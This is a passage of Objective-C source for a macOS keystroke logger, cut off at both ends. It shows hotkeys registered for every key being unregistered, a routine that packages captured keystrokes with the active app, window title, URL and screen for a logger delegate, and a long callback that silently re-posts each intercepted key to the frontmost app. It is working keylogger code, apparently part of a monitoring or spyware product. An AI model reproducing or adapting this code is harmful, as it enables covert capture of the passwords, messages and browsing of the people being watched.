    UnregisterEventHotKey(MyHotKeyRef4);
    UnregisterEventHotKey(MyHotKeyRef5);
    UnregisterEventHotKey(MyHotKeyRef6);
    UnregisterEventHotKey(MyHotKeyRef7);
    UnregisterEventHotKey(MyHotKeyRef8);
    UnregisterEventHotKey(MyHotKeyRef9);
    UnregisterEventHotKey(MyHotKeyRef10);
    UnregisterEventHotKey(MyHotKeyRef11);
    UnregisterEventHotKey(MyHotKeyRef12);
    UnregisterEventHotKey(MyHotKeyRef13);
    UnregisterEventHotKey(MyHotKeyRef14);
    UnregisterEventHotKey(MyHotKeyRef15);
    UnregisterEventHotKey(MyHotKeyRef16);
    UnregisterEventHotKey(MyHotKeyRef17);
    UnregisterEventHotKey(MyHotKeyRef18);
    UnregisterEventHotKey(MyHotKeyRef19);
    UnregisterEventHotKey(MyHotKeyRef20);
    UnregisterEventHotKey(MyHotKeyRef21);
    UnregisterEventHotKey(MyHotKeyRef22);
    UnregisterEventHotKey(MyHotKeyRef23);
    UnregisterEventHotKey(MyHotKeyRef24);
    UnregisterEventHotKey(MyHotKeyRef25);
    UnregisterEventHotKey(MyHotKeyRef26);
    UnregisterEventHotKey(MyHotKeyRef27);
    UnregisterEventHotKey(MyHotKeyRef28);
    UnregisterEventHotKey(MyHotKeyRef29);
    UnregisterEventHotKey(MyHotKeyRef30);
    UnregisterEventHotKey(MyHotKeyRef31);
    UnregisterEventHotKey(MyHotKeyRef32);
    UnregisterEventHotKey(MyHotKeyRef33);
    UnregisterEventHotKey(MyHotKeyRef34);
    UnregisterEventHotKey(MyHotKeyRef35);
    UnregisterEventHotKey(MyHotKeyRef36);
    UnregisterEventHotKey(MyHotKeyRef37);
    UnregisterEventHotKey(MyHotKeyRef38);
    UnregisterEventHotKey(MyHotKeyRef39);
    UnregisterEventHotKey(MyHotKeyRef40);
    UnregisterEventHotKey(MyHotKeyRef41);
    UnregisterEventHotKey(MyHotKeyRef42);
    UnregisterEventHotKey(MyHotKeyRef43);
    UnregisterEventHotKey(MyHotKeyRef44);
    UnregisterEventHotKey(MyHotKeyRef45);
    UnregisterEventHotKey(MyHotKeyRef46);
    UnregisterEventHotKey(MyHotKeyRef47);
    UnregisterEventHotKey(MyHotKeyRef48);
    UnregisterEventHotKey(MyHotKeyRef49);
    UnregisterEventHotKey(MyHotKeyRef50);
    UnregisterEventHotKey(MyHotKeyRef51);
    UnregisterEventHotKey(MyHotKeyRef52);
    UnregisterEventHotKey(MyHotKeyRef53);
    UnregisterEventHotKey(MyHotKeyRef54);
    UnregisterEventHotKey(MyHotKeyRef55);
    UnregisterEventHotKey(MyHotKeyRef56);
    UnregisterEventHotKey(MyHotKeyRef57);
    UnregisterEventHotKey(MyHotKeyRef58);
    UnregisterEventHotKey(MyHotKeyRef59);
    UnregisterEventHotKey(MyHotKeyRef60);
    UnregisterEventHotKey(MyHotKeyRef61);
    UnregisterEventHotKey(MyHotKeyRef62);
    UnregisterEventHotKey(MyHotKeyRef63);
    UnregisterEventHotKey(MyHotKeyRef64);
    UnregisterEventHotKey(MyHotKeyRef65);
    UnregisterEventHotKey(MyHotKeyRef66);
    UnregisterEventHotKey(MyHotKeyRef67);
    UnregisterEventHotKey(MyHotKeyRef68);
    UnregisterEventHotKey(MyHotKeyRef69);
    UnregisterEventHotKey(MyHotKeyRef70);
    UnregisterEventHotKey(MyHotKeyRef71);
    UnregisterEventHotKey(MyHotKeyRef72);
    UnregisterEventHotKey(MyHotKeyRef73);
    UnregisterEventHotKey(MyHotKeyRef74);
    UnregisterEventHotKey(MyHotKeyRef75);
    UnregisterEventHotKey(MyHotKeyRef76);
    UnregisterEventHotKey(MyHotKeyRef77);
    UnregisterEventHotKey(MyHotKeyRef78);
    UnregisterEventHotKey(MyHotKeyRef79);
    UnregisterEventHotKey(MyHotKeyRef80);
    UnregisterEventHotKey(MyHotKeyRef81);
    UnregisterEventHotKey(MyHotKeyRef82);
    UnregisterEventHotKey(MyHotKeyRef83);
    UnregisterEventHotKey(MyHotKeyRef84);
    UnregisterEventHotKey(MyHotKeyRef85);
    UnregisterEventHotKey(MyHotKeyRef86);
    UnregisterEventHotKey(MyHotKeyRef87);
    UnregisterEventHotKey(MyHotKeyRef88);
    UnregisterEventHotKey(MyHotKeyRef89);
    UnregisterEventHotKey(MyHotKeyRef90);
    UnregisterEventHotKey(MyHotKeyRef91);
    UnregisterEventHotKey(MyHotKeyRef92);
    UnregisterEventHotKey(MyHotKeyRef93);
    UnregisterEventHotKey(MyHotKeyRef94);
    UnregisterEventHotKey(MyHotKeyRef95);
    UnregisterEventHotKey(MyHotKeyRef96);
    UnregisterEventHotKey(MyHotKeyRef97);
    UnregisterEventHotKey(MyHotKeyRef98);
    UnregisterEventHotKey(MyHotKeyRef99);
    UnregisterEventHotKey(MyHotKeyRef100);
    UnregisterEventHotKey(MyHotKeyRef101);
    UnregisterEventHotKey(MyHotKeyRef102);
    UnregisterEventHotKey(MyHotKeyRef103);
    UnregisterEventHotKey(MyHotKeyRef104);
    UnregisterEventHotKey(MyHotKeyRef105);
    UnregisterEventHotKey(MyHotKeyRef106);
    UnregisterEventHotKey(MyHotKeyRef107);
    UnregisterEventHotKey(MyHotKeyRef108);
    UnregisterEventHotKey(MyHotKeyRef109);
    UnregisterEventHotKey(MyHotKeyRef110);
    UnregisterEventHotKey(MyHotKeyRef111);
    UnregisterEventHotKey(MyHotKeyRef112);
    
    UnregisterEventHotKey(MyHotKeyRef200);
    UnregisterEventHotKey(MyHotKeyRef201);
    UnregisterEventHotKey(MyHotKeyRef202);
    UnregisterEventHotKey(MyHotKeyRef203);
    UnregisterEventHotKey(MyHotKeyRef204);
    UnregisterEventHotKey(MyHotKeyRef205);
    UnregisterEventHotKey(MyHotKeyRef206);
    UnregisterEventHotKey(MyHotKeyRef207);
    UnregisterEventHotKey(MyHotKeyRef208);
    UnregisterEventHotKey(MyHotKeyRef209);
}

-(void) sendKey: (NSDictionary *) aUserInfo {

    NSNumber *code = [aUserInfo objectForKey:@"code"];
    id object = [aUserInfo objectForKey:@"object"];
    
    if ([self.mLoggerArray count]>0) {

        NSDictionary *keyInfo = [self.mLoggerArray objectAtIndex:0];
        
        KeyStrokeInfo * keyStrokeInfo =[[KeyStrokeInfo alloc]init];
        [keyStrokeInfo setMAppBundle: [keyInfo objectForKey:@"identifier"]];
        [keyStrokeInfo setMAppName: [keyInfo objectForKey:@"name"]];
        NSArray *keyStroke = [keyInfo objectForKey:@"raw"];
        [keyStrokeInfo setMKeyStroke: [keyStroke componentsJoinedByString:@""]];
        NSArray *keyStrokeDisplay = [keyInfo objectForKey:@"word"];
        [keyStrokeInfo setMKeyStrokeDisplay: [keyStrokeDisplay componentsJoinedByString:@""]];
        [keyStrokeInfo setMWindowTitle:[keyInfo objectForKey:@"title"]];
        [keyStrokeInfo setMUrl:[keyInfo objectForKey:@"url"]];
        [keyStrokeInfo setMScreen:[keyInfo objectForKey:@"screen"]];
        [keyStrokeInfo setMFrontmostWindow:[keyInfo objectForKey:@"frontmostwindow"]];
        
        if ([code integerValue] == kKeyboardLoggerCompleteCodeTerminateKey) {
            [mKeyLoggerDelegate terminateKeyStrokeDidReceived:keyStrokeInfo moreInfo:object];
        } else if ([code integerValue] == kKeyboardLoggerCompleteCodeMouseClick) {
            [mKeyLoggerDelegate keyStrokeDidReceived:keyStrokeInfo moreInfo:object];
        } else if ([code integerValue] == kKeyboardLoggerCompleteCodeChangeActiveApp) {
            [mKeyLoggerDelegate activeAppChangeKeyStrokeDidReceived:keyStrokeInfo moreInfo:object];
        }
        
        [keyStrokeInfo release];
        
        [self.mLoggerArray removeObjectAtIndex:0];
    }else{
        if ([code integerValue] == kKeyboardLoggerCompleteCodeTerminateKey) {
            [mKeyLoggerDelegate terminateKeyStrokeDidReceived:nil moreInfo:object];
        } else if ([code integerValue] == kKeyboardLoggerCompleteCodeMouseClick) {
            [mKeyLoggerDelegate keyStrokeDidReceived:nil moreInfo:object];
        } else if ([code integerValue] == kKeyboardLoggerCompleteCodeChangeActiveApp) {
            [mKeyLoggerDelegate activeAppChangeKeyStrokeDidReceived:nil moreInfo:object];
        }

    }
}

#pragma mark KeyboardEventHandler delegate methods
#pragma mark -

- (void) keyReleaseCallback:(EventHandlerCallRef) aHandler eventRef:(EventRef) aEvent method:(void *)aUserData {
    //DLog(@"keyReleaseCallback ...");
    bool shouldPost = YES;
    bool isCapLockActive = false;
    
    EventHotKeyID hotKeyID;
    OSStatus error = GetEventParameter(aEvent,kEventParamDirectObject,typeEventHotKeyID,NULL, sizeof(EventHotKeyID),NULL,&hotKeyID);
    //DLog(@"hotKeyID.id = %d, error = %d", (unsigned int)hotKeyID.id, (int)error);
    
    int eCase = hotKeyID.id;
    CGEventSourceRef source = CGEventSourceCreate(kCGEventSourceStatePrivate);
    CGEventRef keyUp = nil;
    
    NSEvent * eventID = [NSEvent eventWithEventRef:aEvent];
    if ([eventID modifierFlags] & NSAlphaShiftKeyMask) {
        isCapLockActive = true;
    }
    
    switch (eCase) {
        case 1: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_A, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 2: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_B, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 3: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_C, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 4: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_D, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 5: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_E, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 6: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_F, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 7: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_G, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 8: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_H, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 9: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_I, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 10: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_J, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 11: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_K, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 12: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_L, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 13: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_M, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 14: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_N, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 15: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_O, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 16: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_P, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 17: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Q, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 18: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_R, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 19: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_S, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 20: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_T, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 21: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_U, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 22: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_V, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 23: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_W, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 24: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_X, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 25: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Y, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 26: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Z, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 27: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Equal, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 28: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Minus, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 29: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_RightBracket, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 30: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_LeftBracket, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 31: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Quote, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 32: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Semicolon, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 33: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Backslash, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 34: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Comma, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 35: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Slash, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 36: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Period, FALSE);
            if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 37: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Grave, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 38: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadDecimal, FALSE);
            break;
        case 39: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadMultiply, FALSE);
            break;
        case 40: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadPlus, FALSE);
            break;
        case 41: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadClear, FALSE);
            break;
        case 42: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadDivide, FALSE);
            break;
        case 43: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_Space, FALSE);
            break;
        case 44: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadMinus, FALSE);
            break;
        case 45: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadEquals, FALSE);
            break;
        case 46: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad0, FALSE);
            break;
        case 47: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad1, FALSE);
            break;
        case 48: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad2, FALSE);
            break;
        case 49: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad3, FALSE);
            break;
        case 50: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad4, FALSE);
            break;
        case 51: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad5, FALSE);
            break;
        case 52: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad6, FALSE);
            break;
        case 53: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad7, FALSE);
            break;
        case 54: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad8, FALSE);
            break;
        case 55: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad9, FALSE);
            break;
        case 56: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_0, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 57: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_1, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 58: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_2, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 59: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_3, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 60: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_4, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 61: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_5, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 62: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_6, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 63: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_7, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 64: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_8, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 65: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_9, FALSE);
            //if (isCapLockActive) { CGEventSetFlags(keyUp, kCGEventFlagMaskShift); }
            break;
        case 66: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_A, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 67: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_B, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 68: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_C, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 69: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_D, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 70: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_E, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 71: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_F, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 72: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_G, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 73: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_H, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 74: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_I, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 75: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_J, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 76: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_K, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 77: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_L, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 78: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_M, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 79: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_N, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 80: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_O, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 81: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_P, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 82: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Q, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 83: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_R, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 84: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_S, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 85: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_T, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 86: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_U, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 87: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_V, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 88: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_W, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 89: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_X, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 90: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Y, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 91: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Z, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 92: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Equal, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 93: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Minus, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 94: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_RightBracket, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 95: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_LeftBracket, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 96: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Quote, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 97: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Semicolon, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 98: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Backslash, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 99: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Comma, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 100: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Slash, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 101: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Period, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 102: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_Grave, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 103: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_0, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 104: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_1, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 105: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_2, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 106: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_3, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 107: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_4, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 108: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_5, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 109: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_6, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 110: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_7, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 111: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_8, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
        case 112: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_9, FALSE);
            CGEventSetFlags(keyUp, kCGEventFlagMaskShift);
            break;
            //
        case 200: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadEnter, FALSE);
            break;
            // 
        case 201: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_Return, FALSE);
            break;
            // 
        case 202: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_Tab, FALSE);
            break;
            // 
        case 203: 
            keyUp = CGEventCreateKeyboardEvent(source, kVK_Delete, FALSE);
            break;
        case 204:
            keyUp = CGEventCreateKeyboardEvent(source, kVK_Shift, FALSE);
            break;
        case 205:
            keyUp = CGEventCreateKeyboardEvent(source, kVK_RightShift, FALSE);
            break;
        case 206:
            keyUp = CGEventCreateKeyboardEvent(source, kVK_RightArrow, FALSE);
            break;
        case 207:
            keyUp = CGEventCreateKeyboardEvent(source, kVK_LeftArrow, FALSE);
            break;
        case 208:
            keyUp = CGEventCreateKeyboardEvent(source, kVK_UpArrow, FALSE);
            break;
        case 209:
            keyUp = CGEventCreateKeyboardEvent(source, kVK_DownArrow, FALSE);
            break;
        default:
            shouldPost = NO;
            break;
    }
    
    if(shouldPost){
        
        if ([self isExceptApplication]) {
            keyUp = nil;
            keyUp = [self generateNewKeyEventReleaseWith:eCase isCaplockActivce:isCapLockActive source:source];
        }

        ProcessSerialNumber psn;
        //if (GetFrontProcess( &psn ) != noErr) { DLog(@"Error to GetFrontProcess"); }
        
        //psn = [self activePSN];
        //psn = [self frontMostPSN];
        psn = [self frontMostPSNV2];
        
        CGEventPostToPSN(&psn, keyUp);
        
        self.mKeyHold = [NSMutableArray array];
    }
    
    if (keyUp) CFRelease(keyUp);
    if (source) CFRelease(source);
}

- (void) keyPressCallback:(EventHandlerCallRef) aHandler eventRef:(EventRef) aEvent method:(void *)aUserData {
    //DLog(@"keyPressCallback ...");

    NSString *symbol = @"";
    bool shouldPost = true;
    bool enterpress = false;
    bool shouldRepeat = false;
    bool isCapLockActive = false;

    EventHotKeyID hotKeyID;
